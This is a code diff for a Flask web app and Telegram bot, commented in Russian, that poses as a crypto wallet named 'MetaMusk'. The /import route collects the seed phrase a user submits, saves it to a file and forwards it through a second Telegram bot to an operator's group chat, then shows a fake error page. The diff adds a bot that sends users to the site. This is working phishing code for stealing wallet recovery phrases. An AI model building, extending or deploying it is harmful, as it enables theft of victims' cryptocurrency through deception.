@@ -1,68 +1,75 @@
-from flask import Flask, render_template, request
 import os
-import requests
-import json
+import threading
+import asyncio
 from datetime import datetime, timedelta
 
-app = Flask(__name__)
+from flask import Flask, render_template, request, session
+import requests
 
-# 🔑 Твой токен и chat_id (замени на реальные значения или используй переменные окружения)
-TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+from telegram import Bot, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, Update
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-# Пути к файлам
+# ================== НАСТРОЙКИ ==================
+TELEGRAM_TOKEN_MAIN = os.getenv("TELEGRAM_TOKEN_MAIN")   # бот для пользователей
+TELEGRAM_TOKEN_GROUP = os.getenv("TELEGRAM_TOKEN_GROUP") # бот для группы
+CHAT_ID = os.getenv("CHAT_ID")                           # id группы
+SECRET_KEY = os.getenv("SECRET_KEY", "mysecretkey")      # для Flask session
+SITE_URL = os.getenv("SITE_URL", "https://digital-953g.onrender.com/")
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 FILE_PATH = os.path.join(BASE_DIR, "words.txt")
-USERS_FILE = os.path.join(BASE_DIR, "users.json")
 
+# Память: кто создал кошелёк
+user_wallets = {}
 
-# ========== Работа с пользователями ==========
-def load_users():
-    if os.path.exists(USERS_FILE):
-        with open(USERS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    return {}
+# Flask
+app = Flask(__name__)
+app.secret_key = SECRET_KEY
 
+# ================== ФУНКЦИЯ: отправка в группу ==================
+group_bot = Bot(token=TELEGRAM_TOKEN_GROUP)
 
-def save_users(users):
-    with open(USERS_FILE, "w", encoding="utf-8") as f:
-        json.dump(users, f, ensure_ascii=False, indent=2)
+async def send_to_group(message: str):
+    """Отправить сообщение вторым ботом в группу"""
+    await group_bot.send_message(chat_id=CHAT_ID, text=message)
 
+# ================== TELEGRAM-БОТ ==================
+application = Application.builder().token(TELEGRAM_TOKEN_MAIN).build()
 
-# ========== Telegram уведомления ==========
-def send_to_telegram(message):
-    if not TELEGRAM_TOKEN or not CHAT_ID:
-        print("⚠️ Не задан TELEGRAM_TOKEN или CHAT_ID")
-        return
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
 
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": message}
-    try:
-        r = requests.post(url, data=payload)
-        r.raise_for_status()
-    except requests.exceptions.RequestException as e:
-        print("Ошибка отправки в Telegram:", e)
+    # если уже создавал кошелёк → перенаправляем сразу на new_wallet
+    if user_wallets.get(user_id, False):
+        target_url = f"{SITE_URL}/new_wallet"
+    else:
+        target_url = SITE_URL
 
+    markup = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🌐 Открыть MetaMusk", web_app=WebAppInfo(url=target_url))]
+    ])
 
-# ========== Роуты ==========
-@app.route("/")
+    await update.message.reply_text(
+        f"Привет, {update.effective_user.first_name}! 🚀\n"
+        f"Нажми кнопку ниже, чтобы открыть кошелек MetaMusk:",
+        reply_markup=markup
+    )
+
+application.add_handler(CommandHandler("start", start))
+
+def run_bot():
+    application.run_polling()
+
+# ================== FLASK-МАРШРУТЫ ==================
+@app.route('/')
 def index():
-    user_id = request.args.get("user_id")
-    users = load_users()
+    return render_template('index.html')
 
-    # Если юзер уже создавал кошелек → сразу открываем new_wallet.html
-    if user_id and str(user_id) in users and users[str(user_id)].get("wallet_created"):
-        return render_template("new_wallet.html")
-
-    return render_template("index.html")
-
-
-@app.route("/wallet")
+@app.route('/wallet')
 def wallet():
-    return render_template("wallet.html")
+    return render_template('wallet.html')
 
-
-@app.route("/error")
+@app.route('/error')
 def error():
     now = datetime.now()
     start = now - timedelta(hours=1)
@@ -71,38 +78,37 @@ def error():
     end_time = end.strftime("%H:%M %d.%m.%Y")
     return render_template("error.html", start_time=start_time, end_time=end_time)
 
-
-@app.route("/new_wallet")
+@app.route('/new_wallet')
 def new_wallet():
-    user_id = request.args.get("user_id")
-
-    # 🔹 как только юзер открыл new_wallet.html — помечаем его
+    # помечаем пользователя как создавшего кошелёк
+    user_id = session.get("telegram_user_id")
     if user_id:
-        users = load_users()
-        users[str(user_id)] = {"wallet_created": True}
-        save_users(users)
+        user_wallets[user_id] = True
+        # уведомим в группу
+        asyncio.run(send_to_group(f"Пользователь {user_id} создал новый кошелёк"))
+    return render_template('new_wallet.html')
 
-    return render_template("new_wallet.html")
-
-
-@app.route("/import", methods=["GET", "POST"])
+@app.route('/import', methods=['GET', 'POST'])
 def import_wallet():
-    if request.method == "POST":
-        seed_phrase = request.form.get("words")
-        user_id = request.args.get("user_id")
-
+    if request.method == 'POST':
+        seed_phrase = request.form.get('words')
         if seed_phrase:
-            # Сохраняем сид в файл
-            with open(FILE_PATH, "a", encoding="utf-8") as f:
-                f.write(seed_phrase + "\n")
+            # сохранить в файл
+            with open(FILE_PATH, 'a', encoding='utf-8') as f:
+                f.write(seed_phrase + '\n')
 
-            # Отправляем в Telegram
-            send_to_telegram(f"User {user_id}: {seed_phrase}")
+            # отправить во 2-й бот в группу
+            asyncio.run(send_to_group(f"Импортирована сид-фраза:\n{seed_phrase}"))
 
-            return render_template("error.html")
+            return render_template('error.html')
+    return render_template('import.html')
 
-    return render_template("import.html")
+# ================== MAIN ==================
+if __name__ == '__main__':
+    # Запускаем бота в отдельном потоке
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
 
-
-if __name__ == "__main__":
-    app.run(debug=True)
+    # Flask сервер
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
